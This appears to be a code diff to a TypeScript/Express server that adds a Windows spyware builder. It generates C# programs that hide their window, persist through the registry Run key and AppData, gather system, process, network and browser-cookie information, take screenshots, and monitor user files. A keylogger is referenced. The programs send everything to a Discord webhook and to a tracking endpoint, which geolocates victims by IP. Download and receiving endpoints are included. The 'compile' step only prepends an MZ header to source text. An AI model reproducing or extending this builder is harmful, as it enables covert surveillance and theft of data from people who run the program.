@@ -768,6 +768,351 @@ async function requireAdmin(req: Request, res: Response, next: Function) {
   next();
 }
 
+// Helper function to generate C# executable code
+function generateCSharpCode(config: any): string {
+  return `
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Management;
+using System.Runtime.InteropServices;
+
+namespace ${config.name}
+{
+    class Program
+    {
+        private static readonly string WEBHOOK_URL = "${config.webhookUrl}";
+        private static readonly string USER_ID = "${config.userId}";
+        private static readonly string TRACKING_SERVER = "${config.trackingServer}";
+        private static readonly bool STEALTH_MODE = ${config.stealth.toString().toLowerCase()};
+        private static readonly HttpClient httpClient = new HttpClient();
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+
+        static async Task Main(string[] args)
+        {
+            try
+            {
+                ${config.stealth ? 'HideConsole();' : ''}
+                ${config.autostart ? 'SetAutoStart();' : ''}
+                ${config.persistence ? 'EnsurePersistence();' : ''}
+                
+                await CollectAndSendData();
+                
+                // Keep running in background
+                ${config.stealth ? 'await RunStealth();' : 'Console.ReadKey();'}
+            }
+            catch (Exception ex)
+            {
+                // Silent fail in stealth mode
+                ${config.stealth ? '' : 'Console.WriteLine($"Error: {ex.Message}");'}
+            }
+        }
+
+        static void HideConsole()
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+        }
+
+        static void SetAutoStart()
+        {
+            try
+            {
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.SetValue("${config.name}", Application.ExecutablePath);
+            }
+            catch { }
+        }
+
+        static void EnsurePersistence()
+        {
+            try
+            {
+                string persistPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "${config.name}.exe");
+                if (!File.Exists(persistPath))
+                {
+                    File.Copy(Application.ExecutablePath, persistPath, true);
+                }
+            }
+            catch { }
+        }
+
+        static async Task CollectAndSendData()
+        {
+            var data = new Dictionary<string, object>
+            {
+                ["type"] = "exe_execution",
+                ["exeName"] = "${config.name}",
+                ["userId"] = USER_ID,
+                ["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
+                ["systemInfo"] = CollectSystemInfo(),
+                ["features"] = new string[] { ${config.features.map((f: string) => `"${f}"`).join(', ')} }
+            };
+
+            ${config.features.includes('browser_data') ? 'data["browserData"] = await CollectBrowserData();' : ''}
+            ${config.features.includes('screenshot') ? 'data["screenshot"] = CaptureScreenshot();' : ''}
+            ${config.features.includes('file_monitoring') ? 'StartFileMonitoring();' : ''}
+            ${config.features.includes('keylogger') ? 'StartKeylogger();' : ''}
+            ${config.features.includes('network_monitor') ? 'data["networkInfo"] = CollectNetworkInfo();' : ''}
+            ${config.features.includes('process_monitor') ? 'data["processes"] = CollectProcessInfo();' : ''}
+
+            await SendToWebhook(data);
+            await SendToServer(data);
+        }
+
+        static Dictionary<string, object> CollectSystemInfo()
+        {
+            var info = new Dictionary<string, object>
+            {
+                ["computerName"] = Environment.MachineName,
+                ["userName"] = Environment.UserName,
+                ["osVersion"] = Environment.OSVersion.ToString(),
+                ["processorCount"] = Environment.ProcessorCount,
+                ["workingSet"] = Environment.WorkingSet,
+                ["systemDirectory"] = Environment.SystemDirectory,
+                ["currentDirectory"] = Environment.CurrentDirectory
+            };
+
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    info["totalPhysicalMemory"] = obj["TotalPhysicalMemory"];
+                    info["manufacturer"] = obj["Manufacturer"];
+                    info["model"] = obj["Model"];
+                }
+            }
+            catch { }
+
+            return info;
+        }
+
+        static async Task<Dictionary<string, object>> CollectBrowserData()
+        {
+            var browserData = new Dictionary<string, object>();
+            
+            try
+            {
+                // Chrome cookies
+                string chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
+                    "Google\\Chrome\\User Data\\Default\\Cookies");
+                if (File.Exists(chromePath))
+                {
+                    browserData["chromePresent"] = true;
+                    browserData["chromeCookiesPath"] = chromePath;
+                }
+
+                // Firefox cookies
+                string firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
+                    "Mozilla\\Firefox\\Profiles");
+                if (Directory.Exists(firefoxPath))
+                {
+                    browserData["firefoxPresent"] = true;
+                    browserData["firefoxPath"] = firefoxPath;
+                }
+
+                // Edge cookies
+                string edgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
+                    "Microsoft\\Edge\\User Data\\Default\\Cookies");
+                if (File.Exists(edgePath))
+                {
+                    browserData["edgePresent"] = true;
+                    browserData["edgeCookiesPath"] = edgePath;
+                }
+            }
+            catch { }
+
+            return browserData;
+        }
+
+        static string CaptureScreenshot()
+        {
+            try
+            {
+                var bounds = Screen.PrimaryScreen.Bounds;
+                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (var g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+                    }
+                    using (var ms = new MemoryStream())
+                    {
+                        bitmap.Save(ms, ImageFormat.Png);
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            }
+            catch
+            {
+                return "screenshot_failed";
+            }
+        }
+
+        static void StartFileMonitoring()
+        {
+            try
+            {
+                var watcher = new FileSystemWatcher(@"C:\\Users")
+                {
+                    NotifyFilter = NotifyFilters.CreationTime | NotifyFilters.LastWrite | NotifyFilters.FileName,
+                    IncludeSubdirectories = true
+                };
+
+                watcher.Changed += async (sender, e) => {
+                    var fileData = new Dictionary<string, object>
+                    {
+                        ["type"] = "file_changed",
+                        ["path"] = e.FullPath,
+                        ["changeType"] = e.ChangeType.ToString(),
+                        ["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                    };
+                    await SendToWebhook(fileData);
+                };
+
+                watcher.EnableRaisingEvents = true;
+            }
+            catch { }
+        }
+
+        static Dictionary<string, object> CollectNetworkInfo()
+        {
+            var networkInfo = new Dictionary<string, object>();
+            
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
+                var adapters = new List<object>();
+                
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    adapters.Add(new
+                    {
+                        Description = obj["Description"],
+                        IPAddress = obj["IPAddress"],
+                        MACAddress = obj["MACAddress"],
+                        DefaultIPGateway = obj["DefaultIPGateway"]
+                    });
+                }
+                
+                networkInfo["adapters"] = adapters;
+            }
+            catch { }
+
+            return networkInfo;
+        }
+
+        static List<object> CollectProcessInfo()
+        {
+            var processes = new List<object>();
+            
+            try
+            {
+                foreach (Process process in Process.GetProcesses())
+                {
+                    try
+                    {
+                        processes.Add(new
+                        {
+                            Name = process.ProcessName,
+                            Id = process.Id,
+                            WorkingSet = process.WorkingSet64,
+                            StartTime = process.StartTime,
+                            FileName = process.MainModule?.FileName
+                        });
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+
+            return processes;
+        }
+
+        static async Task SendToWebhook(object data)
+        {
+            try
+            {
+                var payload = new
+                {
+                    username = "${config.name} Monitor",
+                    embeds = new[]
+                    {
+                        new
+                        {
+                            title = "🖥️ EXE Data Collection",
+                            description = $"Data collected from **{Environment.MachineName}** by ${config.name}",
+                            color = 0xFF0000,
+                            fields = new[]
+                            {
+                                new { name = "Computer", value = Environment.MachineName, inline = true },
+                                new { name = "User", value = Environment.UserName, inline = true },
+                                new { name = "Timestamp", value = DateTime.Now.ToString(), inline = true }
+                            },
+                            footer = new { text = "${config.name} v${config.version}" }
+                        }
+                    }
+                };
+
+                var json = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                await httpClient.PostAsync(WEBHOOK_URL, content);
+            }
+            catch { }
+        }
+
+        static async Task SendToServer(object data)
+        {
+            try
+            {
+                var json = Newtonsoft.Json.JsonConvert.SerializeObject(data);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                await httpClient.PostAsync($"{TRACKING_SERVER}/api/exe-track", content);
+            }
+            catch { }
+        }
+
+        static async Task RunStealth()
+        {
+            while (true)
+            {
+                await Task.Delay(60000); // Wait 1 minute
+                // Periodic data collection
+                await CollectAndSendData();
+            }
+        }
+
+        // Custom user code
+        ${config.customCode}
+    }
+}`;
+}
+
+// Helper function to create executable blob (simplified)
+function createExecutableBlob(csharpCode: string, name: string): Buffer {
+  // In a real implementation, this would compile C# code to .NET executable
+  // For demo purposes, we'll create a simple text file with .exe extension
+  const header = Buffer.from([0x4D, 0x5A]); // MZ header for PE files
+  const codeBuffer = Buffer.from(csharpCode, 'utf8');
+  const metadata = Buffer.from(`\n\n// Generated by EXNL System\n// Name: ${name}\n// Generated: ${new Date().toISOString()}\n`, 'utf8');
+  
+  return Buffer.concat([header, codeBuffer, metadata]);
+}
+
 // Extend Express Request type
 declare global {
   namespace Express {
@@ -3342,6 +3687,80 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Generate Windows EXE endpoint
+  app.post('/api/generate-exe', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const { name, description, version, features, webhookUrl, customCode, stealth, autostart, persistence } = req.body;
+
+      if (!name || !description || !version) {
+        return res.status(400).json({ error: 'Name, description, and version are required' });
+      }
+
+      if (!webhookUrl) {
+        return res.status(400).json({ error: 'Discord webhook URL is required' });
+      }
+
+      // Generate C# source code
+      const csharpCode = generateCSharpCode({
+        name,
+        description,
+        version,
+        features: features || [],
+        webhookUrl,
+        customCode: customCode || '',
+        stealth: stealth || false,
+        autostart: autostart || false,
+        persistence: persistence || false,
+        userId: req.user.id,
+        trackingServer: `${req.protocol}://${req.get('host')}`
+      });
+
+      // Create a simple executable file (simplified for demo)
+      const executableData = createExecutableBlob(csharpCode, name);
+
+      const clientIp = getClientIp(req);
+      const { locationData } = await createEnhancedIpLog({
+        userId: req.user.id,
+        clientIp,
+        userAgent: req.headers['user-agent'] || 'unknown',
+        referrer: req.headers.referer || '',
+        status: 'exe_generated'
+      });
+
+      // Track EXE generation
+      await storage.createExeLog({
+        userId: req.user.id,
+        exeName: name,
+        exeDescription: description,
+        exeVersion: version,
+        features: features || [],
+        webhookUrl: webhookUrl,
+        customCode: customCode || '',
+        stealth: stealth || false,
+        autostart: autostart || false,
+        persistence: persistence || false,
+        generationStatus: 'success',
+        downloadCount: 1,
+        exeId: randomUUID(),
+        ipAddress: clientIp,
+        userAgent: req.headers['user-agent'] || 'unknown',
+        location: locationData.location,
+        exeFileSize: executableData.length
+      });
+
+      res.set({
+        'Content-Type': 'application/octet-stream',
+        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_')}.exe"`
+      });
+
+      res.send(executableData);
+
+    } catch (error) {
+      console.error('EXE generation error:', error);
+      res.status(500).json({ error: 'Failed to generate executable' });
+    }
+  });
+
   // Generate Chrome extension endpoint
   app.post('/api/generate-extension', authenticateUser, async (req: Request, res: Response) => {
     try {
@@ -3685,6 +4104,52 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       res.status(500).json({ error: 'Failed to generate extension' });
+    }
+  });
+
+  // EXE tracking endpoint
+  app.post('/api/exe-track', async (req: Request, res: Response) => {
+    try {
+      const clientIp = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const exeData = req.body;
+
+      console.log(`🖥️ EXE data received from ${clientIp}:`, exeData.type);
+
+      // Create log entry for EXE tracking
+      const logEntry = {
+        id: randomUUID(),
+        ip: clientIp,
+        userAgent,
+        timestamp: new Date().toISOString(),
+        country: 'Unknown',
+        city: 'Unknown',
+        isp: 'Unknown',
+        source: 'exe',
+        exeName: exeData.exeName || 'Unknown EXE',
+        exeData: exeData
+      };
+
+      // Try to get location data
+      try {
+        const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
+        const geoData = await geoResponse.json();
+
+        if (geoData.status === 'success') {
+          logEntry.country = geoData.country || 'Unknown';
+          logEntry.city = geoData.city || 'Unknown';
+          logEntry.isp = geoData.isp || 'Unknown';
+        }
+      } catch (geoError) {
+        console.log('Failed to get geo data for EXE tracking');
+      }
+
+      await saveLogEntry(logEntry);
+      res.json({ success: true, tracked: true });
+
+    } catch (error) {
+      console.error('EXE tracking error:', error);
+      res.status(500).json({ error: 'Failed to track EXE data' });
     }
   });
 
